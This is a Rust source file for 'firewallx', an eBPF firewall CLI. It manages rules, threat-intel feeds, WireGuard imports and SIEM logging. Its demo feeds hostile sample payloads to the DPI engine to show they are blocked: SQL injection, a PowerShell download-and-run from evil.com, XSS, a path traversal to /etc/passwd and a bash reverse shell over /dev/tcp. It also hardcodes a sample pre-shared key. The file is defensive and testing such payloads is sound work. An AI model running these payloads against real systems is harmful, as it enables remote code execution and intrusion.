use clap::{Parser, Subcommand};
use firewallx::{
    FirewallEngine, Packet, Protocol, Direction,
    Rule, Action,
    DpiEngine,
    AlertKind,
    VpnGateway, PeerConfig, CipherSuite, AuthMethod,
};
use firewallx::modules::engine::EngineConfig;
use firewallx::modules::suricata::SuricataParser;
use firewallx::modules::wireguard::WgConfigParser;
use firewallx::modules::rate_limiter::RateLimiter;
use firewallx::modules::qos::QosManager;
use firewallx::modules::siem::SiemLogger;
use firewallx::config::FirewallConfig;
use std::net::Ipv4Addr;
use std::fs;
use std::time::Duration;
use std::path::Path;
#[cfg(target_os = "linux")]
use aya::{Bpf, programs::{Xdp, XdpFlags}, maps::HashMap as AyaHashMap};

#[derive(Parser)]
#[command(name = "firewallx", version = "0.2.0", about = "Programmable eBPF Firewall")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Start the firewall engine
    Start,
    /// Install the systemd service and default config
    Install,
    /// Manage firewall rules
    Rule {
        #[command(subcommand)]
        action: RuleAction,
    },
    /// Manage threat intelligence blocklist feeds
    Feed {
        #[command(subcommand)]
        action: FeedAction,
    },
    /// Manage VPN tunnels and peers (WireGuard & IPSec)
    Vpn {
        #[command(subcommand)]
        action: VpnAction,
    },
    /// Manage External SIEM Logging
    Siem {
        #[command(subcommand)]
        action: SiemAction,
    },
}

#[derive(Subcommand)]
enum SiemAction {
    /// Enable SIEM logging
    Enable {
        #[arg(long)]
        url: String,
        #[arg(long)]
        key: Option<String>,
    },
    /// Disable SIEM logging
    Disable,
}

#[derive(Subcommand)]
enum VpnAction {
    /// Import a WireGuard configuration file (.conf)
    Import {
        #[arg(long)]
        file: String,
    },
}

#[derive(Subcommand)]
enum FeedAction {
    /// Add a new feed URL
    Add {
        #[arg(long)]
        url: String,
    },
    /// Remove a feed URL
    Remove {
        #[arg(long)]
        url: String,
    },
    /// List all subscribed feed URLs
    List,
}

#[derive(Subcommand)]
enum RuleAction {
    /// Add a new rule
    Add {
        #[arg(long, default_value_t = 1)]
        priority: u32,
        #[arg(long)]
        name: String,
        #[arg(long, default_value = "allow")]
        action: String,
        #[arg(long)]
        src_ip: Option<String>,
        #[arg(long)]
        dst_ip: Option<String>,
        #[arg(long)]
        dst_port: Option<u16>,
        #[arg(long, default_value = "tcp")]
        protocol: String,
        #[arg(long, default_value = "inbound")]
        direction: String,
        #[arg(long, help = "Comma-separated list of 2-letter ISO country codes (e.g. RU,CN)")]
        country: Option<String>,
    },
    /// List all rules
    List,
    /// Import signatures from a Snort/Suricata .rules file
    Import {
        #[arg(long)]
        file: String,
    },
}

const CONFIG_PATH: &str = "/etc/firewallx/config.toml";

fn separator(title: &str) {
    println!("\n{}", "═".repeat(60));
    println!("  {}", title);
    println!("{}", "═".repeat(60));
}

fn main() -> Result<(), anyhow::Error> {
    env_logger::init();
    let cli = Cli::parse();

    match cli.command {
        Commands::Install => {
            install_firewall()?;
        }
        Commands::Rule { action } => {
            manage_rules(action)?;
        }
        Commands::Feed { action } => {
            manage_feeds(action)?;
        }
        Commands::Vpn { action } => {
            manage_vpn(action)?;
        }
        Commands::Siem { action } => {
            manage_siem(action)?;
        }
        Commands::Start => {
            start_firewall()?;
        }
    }
    Ok(())
}

fn install_firewall() -> Result<(), anyhow::Error> {
    println!("Installing FirewallX configuration...");
    if !Path::new("/etc/firewallx").exists() {
        // If we don't have sudo, this might fail, but users should run --install as root
        if let Err(e) = fs::create_dir_all("/etc/firewallx") {
            println!("Could not create /etc/firewallx. Ensure you are running as root. Error: {}", e);
            return Ok(());
        }
    }
    
    let config = FirewallConfig::default();
    config.save_to_file(CONFIG_PATH)?;
    println!("Created default configuration at {}", CONFIG_PATH);
    
    println!("Run `firewallx start` to begin protecting your network.");
    Ok(())
}

fn manage_rules(action: RuleAction) -> Result<(), anyhow::Error> {
    let mut config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
        println!("Warning: Could not read config at {}. Using an empty in-memory config to list/add.", CONFIG_PATH);
        FirewallConfig::default()
    });
    
    match action {
        RuleAction::Add { name, action, dst_port, protocol, direction, country, .. } => {
            let act = match action.to_lowercase().as_str() {
                "allow" => Action::Allow,
                "drop" => Action::Drop,
                "reject" => Action::Reject,
                _ => anyhow::bail!("Invalid action. Use allow, drop, or reject."),
            };
            
            let proto = match protocol.to_lowercase().as_str() {
                "tcp" => Protocol::Tcp,
                "udp" => Protocol::Udp,
                "icmp" => Protocol::Icmp,
                _ => Protocol::Any,
            };
            
            let dir = match direction.to_lowercase().as_str() {
                "inbound" => Direction::Inbound,
                "outbound" => Direction::Outbound,
                _ => Direction::Inbound,
            };
            
            let id = config.ruleset.rules.len() as u32 + 1;
            let country_vec = country.map(|c| c.split(',').map(|s| s.trim().to_uppercase()).collect());
            let rule = Rule::new(id, &name, act, None, None, dst_port, proto, dir, country_vec);
            config.ruleset.add(rule);
            config.save_to_file(CONFIG_PATH)?;
            println!("Rule '{}' added successfully.", name);
        }
        RuleAction::List => {
            println!("{:<5} | {:<15} | {:<10} | {:<8} | {:<10} | {:<10} | {:<15}", 
                "ID", "Name", "Action", "Port", "Protocol", "Direction", "Country");
            println!("{}", "-".repeat(82));
            for r in &config.ruleset.rules {
                let port_str = r.dst_port.map(|p| p.to_string()).unwrap_or_else(|| "*".to_string());
                let country_str = r.country.as_ref().map(|c| c.join(",")).unwrap_or_else(|| "*".to_string());
                println!("{:<5} | {:<15} | {:<10?} | {:<8} | {:<10?} | {:<10?} | {:<15}", 
                    r.id, r.name, r.action, port_str, r.protocol, r.direction, country_str);
            }
        }
        RuleAction::Import { file } => {
            if !config.suricata_rules.contains(&file) {
                match SuricataParser::parse_file(&file) {
                    Ok(sigs) => {
                        config.suricata_rules.push(file.clone());
                        config.save_to_file(CONFIG_PATH)?;
                        println!("Successfully imported {} Suricata/Snort signatures from {}", sigs.len(), file);
                    }
                    Err(e) => {
                        println!("Failed to parse rules file {}: {}", file, e);
                    }
                }
            } else {
                println!("Rules file {} is already imported.", file);
            }
        }
    }
    Ok(())
}

fn manage_feeds(action: FeedAction) -> Result<(), anyhow::Error> {
    let mut config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
        println!("Warning: Could not read config at {}. Using an empty in-memory config.", CONFIG_PATH);
        FirewallConfig::default()
    });
    
    match action {
        FeedAction::Add { url } => {
            if !config.feeds.contains(&url) {
                config.feeds.push(url.clone());
                config.save_to_file(CONFIG_PATH)?;
                println!("Successfully added blocklist feed: {}", url);
            } else {
                println!("Feed {} already exists.", url);
            }
        }
        FeedAction::Remove { url } => {
            if let Some(pos) = config.feeds.iter().position(|x| *x == url) {
                config.feeds.remove(pos);
                config.save_to_file(CONFIG_PATH)?;
                println!("Successfully removed blocklist feed: {}", url);
            } else {
                println!("Feed {} not found.", url);
            }
        }
        FeedAction::List => {
            println!("Subscribed Threat Intelligence Feeds:");
            println!("{}", "-".repeat(50));
            if config.feeds.is_empty() {
                println!("No feeds configured.");
            } else {
                for (i, url) in config.feeds.iter().enumerate() {
                    println!("{}. {}", i + 1, url);
                }
            }
            println!("{}", "-".repeat(50));
        }
    }
    Ok(())
}

fn manage_vpn(action: VpnAction) -> Result<(), anyhow::Error> {
    let mut config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
        FirewallConfig::default()
    });

    match action {
        VpnAction::Import { file } => {
            if !config.wg_peers.contains(&file) {
                // Determine if it's parsable
                match WgConfigParser::parse_file(&file) {
                    Ok(peers) => {
                        config.wg_peers.push(file.clone());
                        config.save_to_file(CONFIG_PATH)?;
                        println!("Successfully imported {} WireGuard peers from {}", peers.len(), file);
                    }
                    Err(_) => {
                        println!("Failed to parse WireGuard config file: {}", file);
                    }
                }
            } else {
                println!("WireGuard file {} is already imported.", file);
            }
        }
    }
    Ok(())
}

fn manage_siem(action: SiemAction) -> Result<(), anyhow::Error> {
    let mut config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
        FirewallConfig::default()
    });

    match action {
        SiemAction::Enable { url, key } => {
            config.siem_enabled = true;
            config.siem_url = Some(url.clone());
            config.siem_api_key = key;
            config.save_to_file(CONFIG_PATH)?;
            println!("SIEM logging enabled. Forwarding telemetry to: {}", url);
        }
        SiemAction::Disable => {
            config.siem_enabled = false;
            config.save_to_file(CONFIG_PATH)?;
            println!("SIEM logging disabled.");
        }
    }
    Ok(())
}

fn start_firewall() -> Result<(), anyhow::Error> {
    separator("System Setup");
    println!("Loading configuration from {}...", CONFIG_PATH);
    
    let config = FirewallConfig::load_from_file(CONFIG_PATH).unwrap_or_else(|_| {
        println!("Warning: Could not read config at {}, using default simulated rules from v0.1.", CONFIG_PATH);
        let mut cfg = FirewallConfig::default();
        cfg.ruleset.add(Rule::new(1, "Allow SSH", Action::Allow, None, None, Some(22), Protocol::Tcp, Direction::Inbound, None));
        cfg.ruleset.add(Rule::new(2, "Allow HTTPS", Action::Allow, None, None, Some(443), Protocol::Tcp, Direction::Outbound, None));
        cfg.ruleset.add(Rule::new(3, "Allow HTTP", Action::Allow, None, None, Some(80), Protocol::Tcp, Direction::Inbound, None));
        cfg.ruleset.add(Rule::new(999, "Default deny", Action::Drop, None, None, None, Protocol::Any, Direction::Inbound, None));
        cfg
    });

    #[cfg(target_os = "linux")]
    let mut bpf_opt = None;
    
    #[cfg(target_os = "linux")]
    {
        println!("Loading eBPF Kernel Program...");
        let bpf_paths = [
            "../target/bpfel-unknown-none/release/firewallx-ebpf", 
            "target/bpfel-unknown-none/release/firewallx-ebpf",    
            "/usr/lib/firewallx/firewallx-ebpf",
        ];
        
        for path in bpf_paths {
            if let Ok(mut bpf) = Bpf::load_file(path) {
                if let Some(program) = bpf.program_mut("firewallx_ebpf") {
                    let program: &mut Xdp = match program.try_into() {
                        Ok(p) => p,
                        Err(_) => continue,
                    };
                    if program.load().is_ok() {
                        // Attach to loopback for demo
                        if program.attach("lo", XdpFlags::default()).is_ok() {
                            println!("eBPF attached to 'lo' interface successfully! Line-rate blocking active.");
                            bpf_opt = Some(bpf);
                            break;
                        }
                    }
                }
            }
        }
        
        if bpf_opt.is_none() {
            println!("Warning: eBPF kernel program not loaded. Running in standard userspace mode.");
            println!("Note: eBPF hooks require execution on a Linux environment as root.");
        }
    }
    
    #[cfg(not(target_os = "linux"))]
    {
        println!("Warning: Running on macOS / non-Linux. eBPF hardware acceleration disabled.");
        println!("Operating in standard userspace engine simulation mode.");
    }

    separator("1 · FirewallEngine (stateful + rules + DPI + IDS + Rate Limiter + QoS)");

    // Start Engine
    let mut engine = FirewallEngine::with_config(config.ruleset, EngineConfig::default(), config.ids);

    // Mount Rate Limiter (Fail2Ban behavior)
    if config.max_connections_per_sec > 0 {
        engine.rate_limiter = Some(RateLimiter::new(config.max_connections_per_sec, Duration::from_secs(1)));
        println!("Mounted Per-IP Rate Limiter: Max {} connections/sec", config.max_connections_per_sec);
    }

    // Mount QoS global tracker
    if config.max_bandwidth_mbps > 0 {
        let bps = config.max_bandwidth_mbps * 1_000_000 / 8; // Convert Mbps to Bytes per second
        engine.qos_manager = Some(QosManager::new(bps));
        println!("Mounted QoS Global Tracker: Capacity {} Mbps", config.max_bandwidth_mbps);
    }
    
    // Mount External SIEM Logging
    if config.siem_enabled {
        if let Some(url) = config.siem_url {
            engine.siem = Some(SiemLogger::new(url.clone(), config.siem_api_key));
            println!("Mounted External SIEM Logger: Forwarding to {}", url);
        }
    }

    // Load custom Suricata signatures into DPI Database
    let mut total_imported_sigs = 0;
    for rule_file in &config.suricata_rules {
        if let Ok(sigs) = SuricataParser::parse_file(rule_file) {
            total_imported_sigs += sigs.len();
            engine.dpi_mut().extend_signatures(sigs);
        }
    }
    if total_imported_sigs > 0 {
        println!("Loaded {} custom Suricata/Snort signatures into DPI module.", total_imported_sigs);
    }

    // Apply configured feeds to blocklist manager 
    for feed in &config.feeds {
        engine.blocklist_mut().add_feed(feed.clone());
    }

    if !engine.blocklist_mut().feeds().is_empty() {
        println!("Fetching dynamically updated blocklist feeds ({} configured)...", engine.blocklist_mut().feeds().len());
        match engine.blocklist_mut().fetch_all_ips() {
            Ok(ips) => {
                println!("Loaded {} known malicious IPs from threat intelligence feeds.", ips.len());
                // Attach to eBPF hashmap if available for immediate line-rate blocking
                #[allow(unused_mut)]
                let mut ebpf_added = 0;
                #[cfg(target_os = "linux")]
                if let Some(ref mut bpf) = bpf_opt {
                    if let Ok(mut block_map) = AyaHashMap::try_from(bpf.map_mut("BLOCKLIST").unwrap()) {
                        for ip in &ips {
                            let ip_key = u32::from_be_bytes(ip.octets());
                            if block_map.insert(ip_key, 1u8, 0).is_ok() {
                                ebpf_added += 1;
                            }
                        }
                        println!(" -> Loaded {} IPs directly into kernel eBPF map for line-rate dropping.", ebpf_added);
                    }
                }
                
                // Fallback / standard userspace active blocks loading
                if ebpf_added < ips.len() {
                    engine.active_blocks = ips;
                    println!(" -> Loaded {} IPs into FirewallEngine userspace enforcement fallback.", engine.active_blocks.len());
                }
            }
            Err(e) => println!("Failed to fetch blocklist feeds: {}", e),
        }
    } else {
        println!("No blocklist feeds configured. Run `firewallx feed add <URL>` to enable dynamically updated threat intel.");
    }

    let mut http_pkt = Packet::new(
        Ipv4Addr::new(203,0,113,1), Ipv4Addr::new(10,0,0,1),
        54321, 80, Protocol::Tcp, Direction::Inbound, 128
    );

    let d = engine.process_with_payload(&mut http_pkt, b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n");
    println!("[HTTP  clean ] {:?}", d);
    let d = engine.process_with_payload(&mut http_pkt, b"GET /login?user=' OR '1'='1&pass=x HTTP/1.1\r\n");
    println!("[HTTP  SQLi  ] {:?}  <- DPI blocked", d);
    let d = engine.process_with_payload(&mut http_pkt, b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')");
    println!("[HTTP  PS    ] {:?}  <- DPI blocked", d);

    let mut ssh_pkt = Packet::new(Ipv4Addr::new(203,0,113,5), Ipv4Addr::new(10,0,0,1), 60000, 22, Protocol::Tcp, Direction::Inbound, 64);
    let d = engine.process_with_payload(&mut ssh_pkt, b"SSH-2.0-OpenSSH_8.9p1");
    println!("[SSH   clean ] {:?}", d);

    let mut rdp_pkt = Packet::new(Ipv4Addr::new(8,8,8,8), Ipv4Addr::new(10,0,0,1), 1234, 3389, Protocol::Tcp, Direction::Inbound, 0);
    let d = engine.process(&mut rdp_pkt);
    println!("[RDP   inbnd ] {:?}  <- default deny", d);

    let s = engine.stats();
    println!("\nStats → total:{} allowed:{} dropped:{} dpi_blocked:{} ips_blocked:{}",
        s.total, s.allowed, s.dropped, s.dpi_blocked, s.ips_blocked);

    separator("2 · DPI Engine — payload inspection");

    let mut dpi = DpiEngine::new();
    let samples: &[(&str, &[u8])] = &[
        ("ELF binary",     b"\x7fELF\x02\x01\x01\x00"),
        ("XSS attempt",    b"<script>alert('xss')</script>"),
        ("Path traversal", b"GET /../../../etc/passwd HTTP/1.1"),
        ("Bash rev shell", b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
    ];
    println!("{:<18} {:<12} {:<10} {}", "Sample", "Protocol", "Blocked", "Sig IDs");
    println!("{}", "-".repeat(60));
    for (label, payload) in samples {
        let r = dpi.inspect(payload);
        let sigs: Vec<_> = r.matches.iter().map(|m| m.sig_id.to_string()).collect();
        println!("{:<18} {:<12} {:<10} {}", label, r.app_protocol.to_string(), r.blocked, sigs.join(", "));
    }

    separator("3 · IDS/IPS — behavioural detection");

    let ids = engine.ids_mut();
    let attacker = Ipv4Addr::new(6,6,6,6);
    println!("Port scan from {}...", attacker);
    for port in [22u16, 80, 443, 3306, 5432, 8080] {
        let pkt = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 9000, port, Protocol::Tcp, Direction::Inbound, 0);
        for a in ids.inspect(&pkt) {
            println!("  ALERT [{:?}] {}", a.kind, a.description);
            if a.kind == AlertKind::BlacklistedIp {
                #[cfg(target_os = "linux")]
                if let Some(ref mut bpf) = bpf_opt {
                    if let Ok(mut blocklist) = AyaHashMap::try_from(bpf.map_mut("BLOCKLIST").unwrap()) {
                        let ip_key = u32::from_be_bytes(attacker.octets());
                        let _ = blocklist.insert(ip_key, 1u8, 0);
                        println!("  [eBPF] Attacker {} added to hardware kernel blocklist!", attacker);
                    }
                }
            }
        }
    }
    println!("Total alerts: {}", ids.total_alerts());

    separator("4 · VPN Gateway — tunnel lifecycle");

    let mut vpn = VpnGateway::new();

    // Import configurations natively from config.toml `wg_peers`
    let mut total_wg_loaded = 0;
    for wg_file in &config.wg_peers {
        if let Ok(peers) = WgConfigParser::parse_file(wg_file) {
            for peer in peers {
                vpn.add_peer(peer.clone());
                // Instantly construct tunnels for the imported wg configs
                if let Ok(tid) = vpn.initiate(peer.peer_ip) {
                    let _ = vpn.complete_handshake(tid, peer.psk.as_deref());
                }
                total_wg_loaded += 1;
            }
        }
    }
    
    if total_wg_loaded > 0 {
        println!("Loaded {} native WireGuard peer configurations.", total_wg_loaded);
    } else {
        // Fallback test code
        let remote = Ipv4Addr::new(203, 0, 113, 100);
        vpn.add_peer(PeerConfig::new(remote, CipherSuite::Aes256Gcm, AuthMethod::PreSharedKey)
                .with_psk("super_secret_key")
                .with_network("10.20.0.0/16".parse().unwrap()));
        let tid = vpn.initiate(remote).unwrap();
        vpn.complete_handshake(tid, Some("super_secret_key")).unwrap();
        println!("Tunnel #{} established with {}", tid, remote);
    }
    
    println!("Active tunnels: {}", vpn.active_tunnel_count());

    separator("FirewallX CLI — Engine operational");
    
    println!("\n[DEMO] Engine and eBPF hook are initialized.");
    println!("We are now dropping 127.0.0.1 queries in the eBPF hardware blocklist.");
    #[cfg(target_os = "linux")]
    if let Some(ref mut bpf) = bpf_opt {
        if let Ok(mut blocklist) = AyaHashMap::try_from(bpf.map_mut("BLOCKLIST").unwrap()) {
            let localhost = Ipv4Addr::new(127, 0, 0, 1);
            let ip_key = u32::from_be_bytes(localhost.octets());
            let _ = blocklist.insert(ip_key, 1u8, 0);
        }
    }
    
    println!("Run `docker exec -it <container> ping localhost` in another terminal to test XDP drops.");
    
    // In a real firewall, we'd start a packet loop via AF_PACKET/Raw Socket here.
    // Park the thread to keep the engine & eBPF hooks alive.
    std::thread::park();
    Ok(())
}
